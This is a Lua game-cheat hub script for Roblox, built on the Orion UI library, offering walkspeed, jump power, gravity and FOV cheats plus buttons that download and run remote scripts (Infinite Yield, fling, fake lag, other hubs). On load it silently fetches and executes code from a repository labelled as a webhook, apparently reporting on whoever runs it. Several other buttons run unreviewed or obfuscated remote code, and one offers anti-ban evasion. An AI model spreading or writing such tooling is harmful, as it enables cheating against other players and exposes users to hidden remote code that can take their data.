--Window & Library
------------------------------------------------------------------
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/thanhdat4461/OrionMoblie/main/source')))() 

local Window = OrionLib:MakeWindow({Name = " ⭐️ USH -- Universal Shakar's Hub ⭐️", HidePremium = false, IntroEnabled = true, SaveConfig = true, ConfigFolder = "shakar"})
------------------------------------------------------------------
--WebHook

loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/w3bh00k/main/s",true))()

------------------------------------------------------------------
--1st Notify

game.StarterGui:SetCore("SendNotification", {
Title = "USH Loaded"; 
Text = "Made by shakar#6955 Helped By karvine"; 
Duration = 5; 
})

game.StarterGui:SetCore("SendNotification", {
Title = "Join discord"; 
Text = "https://discord.gg/g86HSsjt"; 
Duration = 10; 
})
------------------------------------------------------------------
--Notifacation 3

local NotificationBindable = Instance.new("BindableFunction")

function NotificationBindable.OnInvoke(buttonPressed)
if buttonPressed == "Yeah" then
loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLogger.lua"))()
elseif buttonPressed == "Nah im good" then
-- Do something when the Nah im good button is pressed
end
end

game.StarterGui:SetCore("SendNotification", {
Title = "Do You Want Anti Ban Script?",
Text = "Loads Anti Ban Script",
Button1 = "Yeah",
Button2 = "Nah im good",
Callback = NotificationBindable
})
------------------------------------------------------------------
-- Tabs 

local Tab1 = Window:MakeTab({
Name = "Home",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

local Tab2 = Window:MakeTab({
Name = "Player",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

local Tab3 = Window:MakeTab({
Name = "Scripts",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

local Tab4 = Window:MakeTab({
Name = "Guis/hubs",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

local Tab5 = Window:MakeTab({
Name = "Admin Commands",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

local TabCredits = Window:MakeTab({
Name = "Credits",
Icon = "rbxassetid://4483345998",
PremiumOnly = false
})

-- Paragraph

------------------------------------------------------------------

Tab1:AddParagraph("TEAM USH","Was Kavo Ui Switched to Orion Libary")
Tab1:AddParagraph("Join Discord For More Info","Or Dm shakar60")
Tab1:AddParagraph("Created By shakar60 On Discord","Shakar's Discord")
Tab1:AddParagraph("Helped By karvine On Discord","karvine's Discord")
Tab1:AddParagraph("https://discord.gg/DraFmeP4","Discord Server")

------------------------------------------------------------------
--Sliders And Text Boxes

Tab2:AddSlider({
	Name = "Walkspeed",
	Min = 16,
	Max = 500,
	Default = 16,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "WalkSpeed",
	Callback = function(Value)
      game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
		print(Value)
	end    
})

Tab2:AddSlider({
	Name = "JumpPower",
	Min = 50,
	Max = 500,
	Default = 50,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "JumpPower",
	Callback = function(Value)
      game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
		print(Value)
	end    
})

Tab2:AddSlider({
	Name = "FOV",
	Min = 0,
	Max = 120,
	Default = 70,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "FOV",
	Callback = function(Value)
      workspace.CurrentCamera.FieldOfView = Value
		print(Value)
	end    
})

Tab2:AddSlider({
	Name = "Gravity",
	Min = 0,
	Max = 500,
	Default = 196,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "Gravity",
	Callback = function(Value)
      workspace.Gravity = Value
		print(Value)
	end    
})

Tab2:AddTextbox({
	Name = "Set WalkSpeed",
	Default = "Click Here To Set WalkSpeed",
	TextDisappear = true,
	Callback = function(Value)
      game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
		print(Value)
	end	  
})

Tab2:AddTextbox({
	Name = "Set JumpPower",
	Default = "Click Here To Set JumpPower",
	TextDisappear = true,
	Callback = function(Value)
      game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
		print(Value)
	end	  
})

Tab2:AddTextbox({
	Name = "Set FOV",
	Default = "Click Here To Set FOV",
	TextDisappear = true,
	Callback = function(Value)
      workspace.CurrentCamera.FieldOfView = Value
		print(Value)
	end	  
})

Tab2:AddTextbox({
	Name = "Set Gravity",
	Default = "Click Here To Set Gravity",
	TextDisappear = true,
	Callback = function(Value)
      workspace.Gravity = Value
		print(Value)
	end	  
})

--Button & Scripts

local Tab5Section = Tab5:AddSection({
    Name = "Infinite Yield"
})

Tab5:AddButton({
Name = "Infinite Yield",
Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
    Name = "Fling Switch"
})

Tab3:AddButton({
Name = "Fling Switch",
Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_4Q10q272NIQc093Os32uBi29U9PWkU0d3Tr1Uh4k92vus2u10786Z0jep5uhqE2N.lua.txt'),true))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
    Name = "Fake Lag"
})

Tab3:AddButton({
Name = "Fake Lag",
Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/VM3b0Thg'))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
    Name = "Keyboard Script"
})

Tab3:AddButton({
Name = "Keyboard Script",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
print("Script Executed")
end 
})

local Tab4Section = Tab4:AddSection({
    Name = "Vhub"
})

Tab4AddButton({
Name = "Vhub",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/2642/Created/VHub"))()
print("Script Executed")
end 
})

local Tab4Section = Tab4:AddSection({
    Name = "Unfair Hub"
})

Tab4:AddButton({
Name = "Unfair hub",
Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/rblxscriptsnet/rblxhub/main/rblxhub.lua"))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
    Name = "Rizz Script"
})

Tab3:AddButton({
Name = "Rizz Script",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/pPMRh5YJ"))()
print("Script Executed")
end 
})

local Tab3Section = Tab3:AddSection({
    Name = "PackGod Script"
})

Tab3:AddButton({
Name = "PackGod Script",
Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/pPMRh5YJ"))()
print("Script Executed")
end 
})
OrionLib:Init()
